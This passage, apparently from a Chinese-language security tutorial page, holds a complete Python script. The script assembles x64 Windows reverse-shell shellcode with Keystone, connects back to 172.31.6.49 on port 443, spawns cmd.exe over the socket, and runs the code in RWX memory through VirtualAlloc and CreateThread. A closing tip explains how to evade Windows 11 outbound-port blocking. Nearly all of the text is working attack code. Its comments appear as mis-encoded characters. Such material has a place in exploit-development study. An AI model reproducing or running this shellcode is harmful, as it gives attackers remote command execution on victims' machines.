struct
<span class="text-purple-400">from</span> keystone <span class="text-purple-400">import</span> *

CODE = (
<span class="text-slate-500"># å®šä½ kernel32 åŸºåº•ä½å€ (Base Address)</span>
    <span class="text-green-400">" start:                          "</span>
    <span class="text-green-400">"   add rsp, 0xfffffffffffffdf8 ;"</span> <span class="text-slate-500"># é¿å…ç©ºä½å…ƒçµ„ (Null Byte) ä¸¦é¨°å‡ºä¸€äº›ç©ºé–“</span>
    <span class="text-green-400">" find_kernel32:                  "</span>
    <span class="text-green-400">"   int3                        ;"</span> <span class="text-slate-500"># Windbg ä¸­æ–·é»ï¼Œåƒ…åœ¨é™¤éŒ¯æ™‚å•Ÿç”¨</span>
    <span class="text-green-400">"   xor rcx, rcx                ;"</span>
    <span class="text-green-400">"   mov rax, gs:[rcx + 0x60]    ;"</span> <span class="text-slate-500"># RAX = &(PEB) [(FS:0x60)]</span>
    <span class="text-green-400">"   mov rax, [rax + 0x18]       ;"</span> <span class="text-slate-500"># RAX = PEB->Ldr</span>
    <span class="text-green-400">"   mov rsi, [rax + 0x20]       ;"</span> <span class="text-slate-500"># RSI = PEB->Ldr.InMemoryOrderModuleList</span>
    <span class="text-green-400">"   lodsq                       ;"</span>
    <span class="text-green-400">"   xchg rax, rsi               ;"</span>
    <span class="text-green-400">"   lodsq                       ;"</span>
    <span class="text-green-400">"   mov rbx, [rax + 0x20]       ;"</span> <span class="text-slate-500"># RBX = Kernel32 åŸºåº•ä½å€</span>
    <span class="text-green-400">"   mov r8, rbx                 ;"</span> <span class="text-slate-500"># å°‡ Kernel32 åŸºåº•ä½å€è¤‡è£½åˆ° R8 æš«å­˜å™¨</span>
<span class="text-slate-500"># è§£æåŒ¯å‡ºä½å€è¡¨ (Export Address Table)</span>
    <span class="text-green-400">"   mov ebx, [rbx+0x3C]         ;"</span> <span class="text-slate-500"># EBX = Kernel32 PE ç°½ç«  (åç§»é‡ 0x3C)</span>
    <span class="text-green-400">"   add rbx, r8                 ;"</span> <span class="text-slate-500"># RBX = kernel32 åŸºåº•ä½å€ + è§£åƒè€ƒå¾Œçš„ç°½ç« åç§»é‡</span>
    <span class="text-green-400">"   xor r12,r12                 ;"</span>
    <span class="text-green-400">"   add r12, 0x88FFFFF          ;"</span>
    <span class="text-green-400">"   shr r12, 0x14               ;"</span>
    <span class="text-green-400">"   mov edx, [rbx+r12]          ;"</span> <span class="text-slate-500"># åŒ¯å‡ºä½å€è¡¨åç§»é‡</span>
    <span class="text-green-400">"   add rdx, r8                 ;"</span> <span class="text-slate-500"># RDX = kernel32.dll + RVA ExportTable = ExportTable ä½å€</span>
    <span class="text-green-400">"   mov r10d, [rdx+0x14]        ;"</span> <span class="text-slate-500"># å‡½æ•¸æ•¸é‡</span>
    <span class="text-green-400">"   xor r11, r11                ;"</span>
    <span class="text-green-400">"   mov r11d, [rdx+0x20]        ;"</span> <span class="text-slate-500"># AddressOfNames RVA</span>
    <span class="text-green-400">"   add r11, r8                 ;"</span> <span class="text-slate-500"># AddressOfNames VMA</span>
<span class="text-slate-500"># å°‹æ‰¾ GetProcAddress åç¨±</span>
    <span class="text-green-400">"   mov rcx, r10                ;"</span>
    <span class="text-green-400">" k32findfunction:                "</span>
    <span class="text-green-400">"   jecxz functionfound         ;"</span> <span class="text-slate-500"># è¿´åœˆç›´åˆ°æˆ‘å€‘åŒ¹é…åˆ° 'GetProcAddress'</span>
    <span class="text-green-400">"   xor ebx,ebx                 ;"</span>
    <span class="text-green-400">"   mov ebx, [r11+4+rcx*4]      ;"</span> <span class="text-slate-500"># EBX = ç¬¬ä¸€å€‹ AddressOfName çš„ RVA</span>
    <span class="text-green-400">"   add rbx, r8                 ;"</span> <span class="text-slate-500"># RBX = å‡½æ•¸åç¨± VMA</span>
    <span class="text-green-400">"   dec rcx                     ;"</span>
    <span class="text-green-400">"   mov rax, 0x41636f7250746547 ;"</span> <span class="text-slate-500"># GetProcA</span>
    <span class="text-green-400">"   cmp [rbx], rax              ;"</span> <span class="text-slate-500"># æª¢æŸ¥æ˜¯å¦æ‰¾åˆ° GetProcA</span>
    <span class="text-green-400">"   jnz k32findfunction         ;"</span>
<span class="text-slate-500"># å–å¾—å‡½æ•¸ä½å€</span>
    <span class="text-green-400">" functionfound:                  "</span>
    <span class="text-green-400">"   xor r11, r11                ;"</span>
    <span class="text-green-400">"   mov r11d, [rdx+0x24]        ;"</span>
    <span class="text-green-400">"   add r11, r8                 ;"</span>
    <span class="text-green-400">"   inc rcx                     ;"</span>
    <span class="text-green-400">"   mov r13w, [r11+rcx*2]       ;"</span> <span class="text-slate-500"># AddressOfNameOrdinals + è¨ˆæ•¸å™¨ã€‚RCX = è¨ˆæ•¸å™¨</span>
    <span class="text-green-400">"   xor r11, r11                ;"</span>
    <span class="text-green-400">"   mov r11d, [rdx+0x1c]        ;"</span>
    <span class="text-green-400">"   add r11, r8                 ;"</span> <span class="text-slate-500"># AddressOfFunctions VMA å­˜å…¥ R11</span>
    <span class="text-green-400">"   mov eax, [r11+4+r13*4]      ;"</span>
    <span class="text-green-400">"   add rax, r8                 ;"</span> <span class="text-slate-500"># å°‡åŸºåº•ä½å€åŠ åˆ°å‡½æ•¸ RVA</span>
    <span class="text-green-400">"   mov r14, rax                ;"</span> <span class="text-slate-500"># GetProcAddress å­˜å…¥ R14</span>
<span class="text-slate-500"># ä½¿ç”¨ GetProcAddress è§£æ LoadLibraryA</span>
    <span class="text-green-400">"   mov rcx, 0x41797261         ;"</span>
    <span class="text-green-400">"   push rcx                    ;"</span>
    <span class="text-green-400">"   mov rcx, 0x7262694c64616f4c ;"</span>
    <span class="text-green-400">"   push rcx                    ;"</span>
    <span class="text-green-400">"   mov rdx, rsp                ;"</span> <span class="text-slate-500"># LoadLibraryA å­˜å…¥ RDX</span>
    <span class="text-green-400">"   mov rcx, r8                 ;"</span> <span class="text-slate-500"># å°‡ Kernel32 åŸºåº•ä½å€è¤‡è£½åˆ° RCX</span>
    <span class="text-green-400">"   sub rsp, 0x30               ;"</span>
    <span class="text-green-400">"   call r14                    ;"</span> <span class="text-slate-500"># å‘¼å« GetProcessAddress</span>
    <span class="text-green-400">"   add rsp, 0x30               ;"</span>
    <span class="text-green-400">"   add rsp, 0x10               ;"</span>
    <span class="text-green-400">"   mov rsi, rax                ;"</span> <span class="text-slate-500"># å°‡ LoadLibrary çš„ä½å€å„²å­˜åœ¨ RSI</span>
<span class="text-slate-500"># å° WS2_32.DLL å‘¼å« LoadLibraryA</span>
    <span class="text-green-400">"   xor rax, rax                ;"</span>
    <span class="text-green-400">"   mov rax, 0x6C6C             ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span>
    <span class="text-green-400">"   mov rax, 0x642E32335F325357 ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span>
    <span class="text-green-400">"   mov rcx, rsp                ;"</span>
    <span class="text-green-400">"   sub rsp, 0x30               ;"</span>
    <span class="text-green-400">"   call rsi                    ;"</span> <span class="text-slate-500"># å‘¼å« LoadLibraryA</span>
    <span class="text-green-400">"   mov r15, rax                ;"</span>
    <span class="text-green-400">"   add rsp, 0x30               ;"</span>
    <span class="text-green-400">"   add rsp, 0x10               ;"</span>
<span class="text-slate-500"># å–å¾— WSAStartup ä½å€</span>
    <span class="text-green-400">"   mov rax, 0x7075             ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span>
    <span class="text-green-400">"   mov rax, 0x7472617453415357 ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span>
    <span class="text-green-400">"   mov rdx, rsp                ;"</span> <span class="text-slate-500"># WSAStartup å­˜å…¥ RDX</span>
    <span class="text-green-400">"   mov rcx, r15                ;"</span> <span class="text-slate-500"># å°‡ WS2_32 åŸºåº•ä½å€è¤‡è£½åˆ° RCX</span>
    <span class="text-green-400">"   sub rsp, 0x30               ;"</span>
    <span class="text-green-400">"   call r14                    ;"</span> <span class="text-slate-500"># å‘¼å« GetProcessAddress</span>
    <span class="text-green-400">"   add rsp, 0x30               ;"</span>
    <span class="text-green-400">"   add rsp, 0x10               ;"</span>
    <span class="text-green-400">"   mov r12, rax                ;"</span> <span class="text-slate-500"># å°‡ WSAStartup çš„ä½å€å„²å­˜åœ¨ R12</span>
<span class="text-slate-500"># å‘¼å« WSAStartup</span>
    <span class="text-green-400">"   xor rcx,rcx                 ;"</span>
    <span class="text-green-400">"   mov cx,408                  ;"</span>
    <span class="text-green-400">"   sub rsp,rcx                 ;"</span>
    <span class="text-green-400">"   lea rdx,[rsp]               ;"</span> <span class="text-slate-500"># lpWSAData [out]</span>
    <span class="text-green-400">"   mov cx,514                  ;"</span> <span class="text-slate-500"># wVersionRequired</span>
    <span class="text-green-400">"   sub rsp,88                  ;"</span>
    <span class="text-green-400">"   call r12                    ;"</span> <span class="text-slate-500"># å‘¼å« WSAStartup</span>
<span class="text-slate-500"># æŸ¥è©¢ WSASocketA ä½å€</span>
    <span class="text-green-400">"   mov rax, 0x4174             ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span>
    <span class="text-green-400">"   mov rax, 0x656b636f53415357 ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span>
    <span class="text-green-400">"   mov rdx, rsp                ;"</span> <span class="text-slate-500"># WSASocketA å­˜å…¥ RDX</span>
    <span class="text-green-400">"   mov rcx, r15                ;"</span> <span class="text-slate-500"># å°‡ WS2_32 åŸºåº•ä½å€è¤‡è£½åˆ° RCX</span>
    <span class="text-green-400">"   sub rsp, 0x30               ;"</span>
    <span class="text-green-400">"   call r14                    ;"</span> <span class="text-slate-500"># å‘¼å« GetProcessAddress</span>
    <span class="text-green-400">"   add rsp, 0x30               ;"</span>
    <span class="text-green-400">"   add rsp, 0x10               ;"</span>
    <span class="text-green-400">"   mov r12, rax                ;"</span> <span class="text-slate-500"># å°‡ WSASocketA çš„ä½å€å„²å­˜åœ¨ R12</span>
<span class="text-slate-500"># ä½¿ç”¨ WSASocketA å»ºç«‹ Socket</span>
    <span class="text-green-400">"   sub rsp,0x208               ;"</span>
    <span class="text-green-400">"   xor rdx, rdx                ;"</span>
    <span class="text-green-400">"   sub rsp, 88                 ;"</span>
    <span class="text-green-400">"   mov [rsp+32], rdx           ;"</span>
    <span class="text-green-400">"   mov [rsp+40], rdx           ;"</span>
    <span class="text-green-400">"   inc rdx                     ;"</span>
    <span class="text-green-400">"   mov rcx, rdx                ;"</span>
    <span class="text-green-400">"   inc rcx                     ;"</span>
    <span class="text-green-400">"   xor r8,r8                   ;"</span>
    <span class="text-green-400">"   add r8,6                    ;"</span>
    <span class="text-green-400">"   xor r9,r9                   ;"</span>
    <span class="text-green-400">"   mov r9w,98*4                ;"</span>
    <span class="text-green-400">"   mov ebx,[r15+r9]            ;"</span>
    <span class="text-green-400">"   xor r9,r9                   ;"</span>
    <span class="text-green-400">"   call r12                    ;"</span>
    <span class="text-green-400">"   mov r13, rax                ;"</span>
    <span class="text-green-400">"   add rsp, 0x208              ;"</span>
<span class="text-slate-500"># æŸ¥è©¢ WSAConnect ä½å€</span>
    <span class="text-green-400">"   mov rax, 0x7463             ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span>
    <span class="text-green-400">"   mov rax, 0x656e6e6f43415357 ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># WSAConnect</span>
    <span class="text-green-400">"   mov rdx, rsp                ;"</span> <span class="text-slate-500"># WSAConnect å­˜å…¥ RDX</span>
    <span class="text-green-400">"   mov rcx, r15                ;"</span> <span class="text-slate-500"># å°‡ WS2_32 åŸºåº•ä½å€è¤‡è£½åˆ° RCX</span>
    <span class="text-green-400">"   sub rsp, 0x30               ;"</span>
    <span class="text-green-400">"   call r14                    ;"</span> <span class="text-slate-500"># å‘¼å« GetProcessAddress</span>
    <span class="text-green-400">"   add rsp, 0x30               ;"</span>
    <span class="text-green-400">"   add rsp, 0x10               ;"</span>
    <span class="text-green-400">"   mov r12, rax                ;"</span>
<span class="text-slate-500"># å‘¼å« WSAConnect...</span>
    <span class="text-green-400">"   mov rcx, r13                ;"</span> <span class="text-slate-500"># æˆ‘å€‘çš„ Socket Handle ä½œç‚ºåƒæ•¸ 1</span>
    <span class="text-green-400">"   sub rsp,0x208               ;"</span>
    <span class="text-green-400">"   xor rax,rax                 ;"</span>
    <span class="text-green-400">"   inc rax                     ;"</span>
    <span class="text-green-400">"   inc rax                     ;"</span>
    <span class="text-green-400">"   mov [rsp], rax              ;"</span> <span class="text-slate-500"># AF_INET = 2</span>
    <span class="text-green-400">"   mov rax, 0xbb01             ;"</span> <span class="text-slate-500"># Port 443</span>
    <span class="text-green-400">"   mov [rsp+2], rax            ;"</span>
    <span class="text-green-400">"   mov rax, 0x31061fac         ;"</span> <span class="text-slate-500"># IP 172.31.6.49</span>
    <span class="text-green-400">"   mov [rsp+4], rax            ;"</span>
    <span class="text-green-400">"   lea rdx,[rsp]               ;"</span>
    <span class="text-green-400">"   mov r8, 0x16                ;"</span>
    <span class="text-green-400">"   xor r9,r9                   ;"</span>
    <span class="text-green-400">"   push r9                     ;"</span> <span class="text-slate-500"># NULL lpCallerData</span>
    <span class="text-green-400">"   push r9                     ;"</span> <span class="text-slate-500"># NULL lpCallerData</span>
    <span class="text-green-400">"   push r9                     ;"</span> <span class="text-slate-500"># NULL lpSQOS</span>
    <span class="text-green-400">"   sub rsp, 0x88               ;"</span> <span class="text-slate-500"># NULL lpSQOS</span>
    <span class="text-green-400">"   call r12                    ;"</span> <span class="text-slate-500"># å‘¼å« WSAConnect</span>
<span class="text-slate-500"># åœ¨ kernel32.dll ä¸­å°‹æ‰¾ CreateProcessA ä½å€</span>
<span class="text-slate-500"># å†æ¬¡æŸ¥è©¢ Kernel32 åŸºåº•ä½å€...</span>
    <span class="text-green-400">"   xor rcx, rcx                ;"</span>
    <span class="text-green-400">"   mov rax, gs:[rcx + 0x60]    ;"</span>
    <span class="text-green-400">"   mov rax, [rax + 0x18]       ;"</span>
    <span class="text-green-400">"   mov rsi, [rax + 0x20]       ;"</span>
    <span class="text-green-400">"   lodsq                       ;"</span>
    <span class="text-green-400">"   xchg rax, rsi               ;"</span>
    <span class="text-green-400">"   lodsq                       ;"</span>
    <span class="text-green-400">"   mov rbx, [rax + 0x20]       ;"</span>
    <span class="text-green-400">"   mov r8, rbx                 ;"</span> <span class="text-slate-500"># å°‡ Kernel32 åŸºåº•ä½å€è¤‡è£½åˆ° R8 æš«å­˜å™¨</span>
<span class="text-slate-500"># å°‹æ‰¾ CreateProcessA çš„ä½å€ã€‚å­˜å…¥ R12 (å…ˆå‰å­˜çš„æ˜¯ WSAConnect)</span>
    <span class="text-green-400">"   mov rax, 0x41737365636f     ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span>
    <span class="text-green-400">"   mov rax, 0x7250657461657243 ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># CreateProcessA</span>
    <span class="text-green-400">"   mov rdx, rsp                ;"</span>
    <span class="text-green-400">"   mov rcx, r8                 ;"</span> <span class="text-slate-500"># å°‡ Kernel32 åŸºåº•ä½å€è¤‡è£½åˆ° RCX</span>
    <span class="text-green-400">"   sub rsp, 0x30               ;"</span>
    <span class="text-green-400">"   call r14                    ;"</span> <span class="text-slate-500"># å‘¼å« GetProcessAddress</span>
    <span class="text-green-400">"   add rsp, 0x30               ;"</span>
    <span class="text-green-400">"   add rsp, 0x10               ;"</span>
    <span class="text-green-400">"   mov r12, rax                ;"</span>
<span class="text-slate-500"># å°‡ cmd.exe å­—ä¸²æ¨å…¥å †ç–Š</span>
    <span class="text-green-400">"   mov rax, 0x6578652e646d63   ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span>
    <span class="text-green-400">"   mov rcx, rsp                ;"</span> <span class="text-slate-500"># RCX = lpApplicationName (cmd.exe)</span>
<span class="text-slate-500"># STARTUPINFOA çµæ§‹</span>
    <span class="text-green-400">"   push r13                    ;"</span> <span class="text-slate-500"># Push STDERROR</span>
    <span class="text-green-400">"   push r13                    ;"</span> <span class="text-slate-500"># Push STDOUTPUT</span>
    <span class="text-green-400">"   push r13                    ;"</span> <span class="text-slate-500"># Push STDINPUT</span>
    <span class="text-green-400">"   xor rax,rax                 ;"</span>
    <span class="text-green-400">"   push ax                     ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span>
    <span class="text-green-400">"   mov rax, 0x100              ;"</span>
    <span class="text-green-400">"   push ax                     ;"</span>
    <span class="text-green-400">"   xor rax,rax                 ;"</span>
    <span class="text-green-400">"   push ax                     ;"</span>
    <span class="text-green-400">"   push ax                     ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># dwXSize = NULL</span>
    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># dwY = NULL</span>
    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># dwX = NULL</span>
    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># lpDesktop = NULL</span>
    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># lpReserved = NULL</span>
    <span class="text-green-400">"   mov rax, 0x68               ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># SizeOfStruct = 0x68</span>
    <span class="text-green-400">"   mov rdi,rsp                 ;"</span> <span class="text-slate-500"># å°‡æŒ‡æ¨™è¤‡è£½åˆ° RDI</span>
<span class="text-slate-500"># å‘¼å« CreateProcessA</span>
    <span class="text-green-400">"   mov rax, rsp                ;"</span> <span class="text-slate-500"># å–å¾—ç›®å‰å †ç–ŠæŒ‡æ¨™</span>
    <span class="text-green-400">"   sub rax, 0x500              ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># ProcessInfo</span>
    <span class="text-green-400">"   push rdi                    ;"</span> <span class="text-slate-500"># StartupInfo = æŒ‡å‘ STARTUPINFOA çš„æŒ‡æ¨™</span>
    <span class="text-green-400">"   xor rax, rax                ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># lpCurrentDirectory = NULL</span>
    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># lpEnvironment = NULL</span>
    <span class="text-green-400">"   push rax                    ;"</span>
    <span class="text-green-400">"   inc rax                     ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># bInheritHandles = 1</span>
    <span class="text-green-400">"   xor rax, rax                ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span>
    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># dwCreationFlags = NULL</span>
    <span class="text-green-400">"   mov r8, rax                 ;"</span> <span class="text-slate-500"># lpThreadAttributes = NULL</span>
    <span class="text-green-400">"   mov r9, rax                 ;"</span> <span class="text-slate-500"># lpProcessAttributes = NULL</span>
    <span class="text-green-400">"   mov rdx, rcx                ;"</span> <span class="text-slate-500"># lpCommandLine = "cmd.exe" å­—ä¸²</span>
    <span class="text-green-400">"   mov rcx, rax                ;"</span> <span class="text-slate-500"># lpApplicationName = NULL</span>
    <span class="text-green-400">"   call r12                    ;"</span> <span class="text-slate-500"># å‘¼å« CreateProcessA</span>
)

ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
<span class="text-purple-400">print</span>(<span class="text-green-400">"Encoded %d instructions..."</span> % count)

sh = <span class="text-green-400">b""</span>
<span class="text-purple-400">for</span> e <span class="text-purple-400">in</span> encoding:
    sh += struct.pack(<span class="text-green-400">"B"</span>, e)
shellcode = <span class="text-yellow-300">bytearray</span>(sh)

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ctypes.windll.kernel32.RtlCopyMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
ctypes.windll.kernel32.CreateThread.argtypes = (
    ctypes.c_int,
    ctypes.c_int,
    ctypes.c_void_p,
    ctypes.c_int,
    ctypes.c_int,
    ctypes.POINTER(ctypes.c_int),
)

ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0), ctypes.c_int(<span class="text-yellow-300">len</span>(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)
)

buf = (ctypes.c_char * <span class="text-yellow-300">len</span>(shellcode)).from_buffer_copy(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), buf, ctypes.c_int(<span class="text-yellow-300">len</span>(shellcode)))

<span class="text-purple-400">print</span>(<span class="text-green-400">"Shellcode located at address %s"</span> % hex(ptr))
<span class="text-purple-400">input</span>(<span class="text-green-400">"...ENTER TO EXECUTE SHELLCODE..."</span>)

ht = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_void_p(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0)),
)
ctypes.windll.kernel32.WaitForSingleObject(ht, -1)</pre></div></div></div><div class="bg-blue-900/20 border border-blue-500/30 p-4 rounded-b-xl flex items-start gap-3"><i class="fa-solid fa-lightbulb text-blue-400 mt-1"></i><p class="text-sm text-blue-200"><strong>TIP:</strong> Windows 11 23H2 å°é–äº†å°æœ¬åœ°å­ç¶²ï¼ˆLocal subnetsï¼‰çš„ TCP 443/4444 å‡ºç«™é€£ç·šï¼ˆåƒ…ç•¶æ™ºæ…§å‹æ‡‰ç”¨ç¨‹å¼æ§åˆ¶ [Smart App Control] ç­–ç•¥è¨­å®šç‚º å°é– [Block] æ™‚ï¼‰ã€‚è«‹é¸æ“‡éæ¨™æº–é€£æ¥åŸ æˆ–ä½¿ç”¨å‘½åç®¡é“ï¼ˆNamed-pipeï¼‰æœ‰æ•ˆè¼‰è·ã€‚</div></div></section><footer class="text-center py-10 text-slate-500 text-sm border-t border-slate-800/50"><p class="mb-2">Generated by <a href="https://wellstsai.com"target="_blank"class="text-sky-500 hover:text-sky-400 transition-colors font-medium">wellstsai.com</a><p>æ’°å¯«æ—¥æœŸï¼š2025-11-25</footer></main>